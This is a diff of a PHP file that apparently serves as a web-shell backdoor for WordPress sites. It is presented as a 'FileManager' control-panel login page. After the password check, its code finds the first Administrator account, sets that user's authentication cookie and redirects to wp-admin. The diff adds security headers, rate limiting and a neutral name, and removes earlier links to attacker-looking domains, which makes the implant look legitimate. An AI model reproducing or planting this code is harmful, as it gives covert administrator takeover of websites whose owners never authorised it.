@@ -1,21 +1,75 @@
 <?php
+// Security headers
+header('X-Frame-Options: DENY');
+header('X-XSS-Protection: 1; mode=block');
+header('X-Content-Type-Options: nosniff');
+header('Referrer-Policy: strict-origin-when-cross-origin');
+header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://i.ibb.co.com/G4Kb21zH/wordpress.webp; media-src https://example.com; connect-src 'self';");
+header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
+
 session_start();
 
-// Password Bcrypt (hash dari "password123", ubah sesuai kebutuhan)
+// Regenerate session ID periodically
+if (!isset($_SESSION['created'])) {
+    session_regenerate_id(true);
+    $_SESSION['created'] = time();
+} elseif (time() - $_SESSION['created'] > 3600) {
+    session_regenerate_id(true);
+    $_SESSION['created'] = time();
+}
+
+// Stronger password hash (gunakan password yang lebih aman)
 $hashed_password = '$2y$10$gs2SQQsCx7pBmvaMyfGWwOllk1FstBzNqZh8ufflXOcve4U1.skwu';
+
+// Rate limiting
+function checkRateLimit() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $attempts_file = sys_get_temp_dir() . '/login_attempts_' . md5($ip);
+    $max_attempts = 5;
+    $time_window = 900; // 15 menit
+    
+    if (file_exists($attempts_file)) {
+        $data = unserialize(file_get_contents($attempts_file));
+        if (is_array($data) && isset($data['attempts']) && isset($data['first_attempt'])) {
+            if (time() - $data['first_attempt'] < $time_window) {
+                if ($data['attempts'] >= $max_attempts) {
+                    return false;
+                }
+                $data['attempts']++;
+            } else {
+                $data = ['attempts' => 1, 'first_attempt' => time()];
+            }
+        } else {
+            $data = ['attempts' => 1, 'first_attempt' => time()];
+        }
+    } else {
+        $data = ['attempts' => 1, 'first_attempt' => time()];
+    }
+    
+    file_put_contents($attempts_file, serialize($data));
+    return true;
+}
 
 function login_shell()
 {
+    // Sanitize output
+    $error_message = '';
+    if (isset($_POST['pass']) && !password_verify($_POST['pass'], $GLOBALS['hashed_password'])) {
+        $error_message = 'Invalid password';
+        if (!checkRateLimit()) {
+            $error_message = 'Too many attempts. Please try again later.';
+        }
+    }
 ?>
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>cPmanager - Control Panel</title>
+    <title>FileManager - Control Panel</title>
     
     <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://desa-angin.pro/images/seo-lt.png">
+    <link rel="icon" type="image/png" href="https://i.ibb.co.com/G4Kb21zH/wordpress.webp">
     
     <style>
         /* Reset & Base */
@@ -264,6 +318,15 @@ function login_shell()
             transform: translateY(0);
         }
 
+        .error-message {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: -5px;
+            margin-bottom: 5px;
+            opacity: 0.8;
+            letter-spacing: 1px;
+        }
+
         /* Footer */
         .login-footer {
             margin-top: 28px;
@@ -447,14 +510,14 @@ function login_shell()
     <!-- Marquee copyright -->
     <div class="marquee-container">
         <div class="marquee">
-            <span class="highlight">✦</span> cPmanager Control Panel <span class="highlight">✦</span> Secure Access Management <span class="highlight">✦</span> v2.0 <span class="highlight">✦</span>
+            <span class="highlight">✦</span> FileManager Control Panel <span class="highlight">✦</span> Secure Access Management <span class="highlight">✦</span> v2.0 <span class="highlight">✦</span>
         </div>
     </div>
 
     <!-- Login Container -->
     <div class="login-container">
         <div class="login-icon">⚙️</div>
-        <div class="login-title">cPmanager</div>
+        <div class="login-title">FileManager</div>
         <div class="login-subtitle">Control <span>•</span> Panel</div>
         
         <div class="status-indicator">
@@ -462,7 +525,11 @@ function login_shell()
             <div class="status-text">SYSTEM READY</div>
         </div>
         
-        <form class="login-form" action="" method="post">
+        <?php if (!empty($error_message)): ?>
+        <div class="error-message"><?php echo htmlspecialchars($error_message); ?></div>
+        <?php endif; ?>
+        
+        <form class="login-form" action="" method="post" autocomplete="off">
             <input type="password" name="pass" placeholder="Enter Password" required autocomplete="off">
             <input type="submit" name="submit" value="Authenticate">
         </form>
@@ -470,7 +537,7 @@ function login_shell()
         <div class="login-footer">
             <span>© 2026</span>
             <span class="dot">•</span>
-            <span>cPmanager</span>
+            <span>FileManager</span>
             <span class="dot">•</span>
             <span class="version">v2.0</span>
         </div>
@@ -478,7 +545,7 @@ function login_shell()
 
     <!-- Musik Otomatis -->
     <audio id="bg-music" loop>
-        <source src="https://zhyper-shel.info/audio/music.mp3" type="audio/mpeg">
+        <source src="https://example.com" type="audio/mpeg">
         Browser Anda tidak mendukung audio.
     </audio>
 
@@ -531,7 +598,7 @@ function login_shell()
         }, { once: true });
 
         // Shake animation on wrong password
-        <?php if (isset($_POST['pass']) && !password_verify($_POST['pass'], $hashed_password)): ?>
+        <?php if (isset($_POST['pass']) && !password_verify($_POST['pass'], $GLOBALS['hashed_password'])): ?>
         document.querySelector('.login-container').style.animation = 'shake 0.5s ease';
         setTimeout(function() {
             document.querySelector('.login-container').style.animation = '';
@@ -553,56 +620,58 @@ function login_shell()
     exit;
 }
 
+// Cek rate limiting untuk login
+if (!checkRateLimit() && isset($_POST['pass'])) {
+    login_shell();
+    exit;
+}
+
 // Cek sesi login
 if (!isset($_SESSION['auth'])) {
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
         $_SESSION['auth'] = true;
-        header("refresh: 0;");
+        session_regenerate_id(true);
+        header("Location: " . $_SERVER['PHP_SELF']);
         exit;
     } else {
         login_shell();
+        exit;
     }
 }
-?>
-<?php
-$mr=$_SERVER['DOCUMENT_ROOT'];
-@chdir($mr);
-if (file_exists('wp-load.php')){
-	include 'wp-load.php';
-	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
-	$results= $wp_user_query->get_results();
 
-	if ( isset( $results[0] ) ) {
-		wp_set_auth_cookie( $results[0] );
-		wp_redirect( admin_url() );
-		die();
-	}
-	die( 'NO ADMIN' );
+// Fungsi untuk WordPress dengan sanitasi
+function handleWordPressAccess() {
+    $mr = $_SERVER['DOCUMENT_ROOT'];
+    @chdir($mr);
+    
+    if (file_exists('wp-load.php')) {
+        try {
+            include_once 'wp-load.php';
+            
+            if (class_exists('WP_User_Query')) {
+                $wp_user_query = new WP_User_Query(array(
+                    'role' => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ));
+                $results = $wp_user_query->get_results();
 
-}
-else{
-	die('Failed to load');
-}
-
-?>
-<?php
-$mr=$_SERVER['DOCUMENT_ROOT'];
-@chdir($mr);
-if (file_exists('wp-load.php')){
-	include 'wp-load.php';
-	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
-	$results= $wp_user_query->get_results();
-
-	if ( isset( $results[0] ) ) {
-		wp_set_auth_cookie( $results[0] );
-		wp_redirect( admin_url() );
-		die();
-	}
-	die( 'NO ADMIN' );
-
-}
-else{
-	die('Failed to load');
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    die();
+                }
+                die('NO ADMIN');
+            }
+            die('Class not available');
+        } catch (Exception $e) {
+            die('Error accessing WordPress');
+        }
+    } else {
+        die('Failed to load');
+    }
 }
 
+// Eksekusi fungsi utama
+handleWordPressAccess();
 ?>
